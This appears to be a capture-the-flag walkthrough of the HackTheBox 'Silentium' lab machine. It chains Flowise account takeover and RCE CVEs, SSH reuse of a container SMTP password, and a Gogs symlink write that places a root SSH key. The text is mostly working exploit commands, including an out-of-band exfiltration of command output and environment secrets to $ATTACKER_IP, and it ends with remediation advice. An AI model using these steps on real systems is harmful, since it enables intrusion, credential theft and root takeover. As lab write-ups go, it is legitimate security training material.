# Silentium — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Silentium · easy · Linux (Ubuntu 24.04)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Chain:** `Flowise account takeover (CVE-2025-58434) → CustomMCP RCE (CVE-2025-59528) → container env
> SMTP password → ben SSH reuse → user → root-run Gogs 0.13.3 symlink file-write (CVE-2025-8110) → root`
>
> Decision-tree format: options, traps, and the way through, with a **✅ Expected** block after each command.
> Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`).
2. **HTB blocks ICMP** — test with TCP connect, not ping.
3. **nginx wildcard vhost** — broad subdomain fuzzing is near-useless; real vhosts come from content
   clues and (later) from reading nginx config *on the box*.
4. **Start your HTTP listener before the RCE exfil** — the MCP RCE doesn't echo stdout, so you read command
   output from an out-of-band callback.
5. **Flowise login route is `/api/v1/auth/login`**, NOT `/api/v1/account/basic-auth` (that always says
   "Authentication failed" regardless of creds — a trap).

---

## Phase 1 — Recon + vhosts

```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
echo "$TARGET silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
```
> **✅ Expected:** only 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). The main site names staff, incl.
> **"Ben — Head of Financial Systems"** → candidate username. Targeted vhost guess →
> `staging.silentium.htb`:
> ```bash
> curl -s http://staging.silentium.htb/api/v1/version    # {"version":"3.0.5"}  -> Flowise 3.0.5
> curl -s http://staging.silentium.htb/api/v1/ping       # pong
> ```

---

## Phase 2 — Foothold step 1: CVE-2025-58434 (Flowise account takeover)

Flowise ≤3.0.5's forgot-password endpoint returns the reset **token in the response body**. With the
site-sourced username `ben@silentium.htb`:
```bash
# 1) leak the tempToken (unauthenticated)
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb"}}'
# -> 201 { ... "tempToken":"<t>" ... }
# 2) reset the password with that token
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb","tempToken":"<t>","password":"Pwned123!"}}'
# 3) log in (REAL route)
curl -s -c flowise_cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"email":"ben@silentium.htb","password":"Pwned123!"}'
```
> **✅ Expected:** step 1 returns a `tempToken`; step 3 returns **200 + cookies** (`token`, `refreshToken`,
> `connect.sid`) and the account is an org admin (`isOrganizationAdmin:true`). You now own the Flowise app.

---

## Phase 3 — Foothold step 2: CVE-2025-59528 (CustomMCP RCE) → container shell

The CustomMCP node passes `mcpServerConfig` into a JS `Function()` constructor → Node code exec.
```bash
# attacker listener FIRST (RCE doesn't echo stdout — exfil out-of-band):
python3 -m http.server 8000 --bind $ATTACKER_IP      # read results from the access log
# POST /api/v1/node-load-method/customMCP with a payload that reaches Function();
# command appends '| base64 -w0' then curls the output to http://$ATTACKER_IP:8000/<b64>
```
> **✅ Expected:** commands run as **`uid=0(root)` inside the Flowise Docker container**
> (hostname like `c78c3cceb7ba`). The `node-load-method` response is always the generic
> `"No Available Actions"` — that's normal; read real output from your listener's log.

### Harvest the container environment:
```bash
# via the RCE, run: env | base64 -w0  and exfil it
```
> **✅ Expected:** env leaks several creds; the useful one is **`SMTP_PASSWORD=r04D!!_R4ge`**.
> ⚠️ `FLOWISE_PASSWORD=F1l3_d0ck3r` is the app's basic-auth only — it does **not** work for SSH. Only the
> SMTP password does. Don't waste tries on `F1l3_d0ck3r` for SSH.

---

## Phase 4 — Lateral: SMTP password → ben SSH (user.txt)

```bash
sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET 'id; cat ~/user.txt'
```
> **✅ Expected:** `uid=1000(ben)` + flag. 🚩 **user.txt captured.**

---

## Phase 5 — Privilege escalation: ben → root (root-run Gogs + CVE-2025-8110)

**Local checklist as ben is clean** — no sudo at all, stock SUID/SGID/caps/cron, not in `docker` group.
The lead is a second internal app. Find it by reading nginx config on the box:
```bash
cat /etc/nginx/sites-available/staging-v2-code      # proxy_pass http://127.0.0.1:3001; vhost staging-v2-code.dev.silentium.htb
ps aux | grep gogs                                  # root ... /opt/gogs/gogs/gogs web   <-- runs as ROOT
/opt/gogs/gogs/gogs --version                       # Gogs 0.13.3
```
> **✅ Expected:** a third vhost proxying to `127.0.0.1:3001` = **Gogs 0.13.3**, running **as root**
> (`app.ini`: `RUN_USER = root`, `DISABLE_REGISTRATION = false`). Add it to the attacker's `/etc/hosts`
> (reachable on port 80): `echo "$TARGET staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts`.

### Junction — CVE-2025-8110: PutContents follows symlinks before writing
Gogs validates the path string for `../` but **doesn't resolve symlinks** — so commit a symlink to any
path, then write through it as the root Gogs process.
```bash
ssh-keygen -t ed25519 -f loot/silentium_root_key -N ""
# ben has no Gogs account; self-register (registration open, captcha-gated — solve by eye) -> pwnagent:Pwnage123!
git clone https://github.com/3jee/CVE-2025-8110 /tmp/CVE-2025-8110
python3 /tmp/CVE-2025-8110/CVE-2025-8110.py --url http://staging-v2-code.dev.silentium.htb \
  -u pwnagent -p 'Pwnage123!' --target-file /root/.ssh/authorized_keys \
  --content-file loot/silentium_root_key.pub
```
> **✅ Expected:** the PoC creates a repo, commits a symlink `payload -> /root/.ssh/authorized_keys`,
> pushes it, then `PUT …/contents/payload` with base64 of your pubkey → Gogs follows the symlink and
> writes it as root → `[+] Write OK`. Then:
> ```bash
> ssh -i loot/silentium_root_key root@$TARGET 'id; cat /root/root.txt'   # uid=0(root)
> ```
> 🚩 **root.txt captured. Box owned.**

---

## The whole thing on one page

```
22 ssh · 80 nginx (wildcard vhost)
   └─ staging.silentium.htb  Flowise 3.0.5
        ├─ CVE-2025-58434 forgot-password token leak → takeover ben@silentium.htb (org admin)
        └─ CVE-2025-59528 CustomMCP Function() RCE → root INSIDE container
             └─ container env: SMTP_PASSWORD=r04D!!_R4ge
                  └─ ben SSH (reuse) · user.txt
                       └─ (on host) nginx config → staging-v2-code.dev.silentium.htb = Gogs 0.13.3 as ROOT
                            └─ self-register → CVE-2025-8110 symlink PutContents → write /root/.ssh/authorized_keys → ROOT
```

## Remediation
- **Flowise:** upgrade ≥3.0.6; never return reset tokens in responses; don't run in unauth edit mode;
  don't pass user input to `Function()`; run container as non-root.
- **Secrets:** don't keep reusable creds in container env; unique passwords per service/account.
- **Gogs:** upgrade; `realpath`-confine writes to the repo tree (resolve symlinks); never run as root
  (use a `git` user); disable open registration internally.

## Cleanup
- Remove the attacker key line from `/root/.ssh/authorized_keys`.
- Delete the throwaway Gogs account `pwnagent` + its repo/API token.
- Restore/rotate ben's Flowise password (changed to `Pwned123!` during takeover).
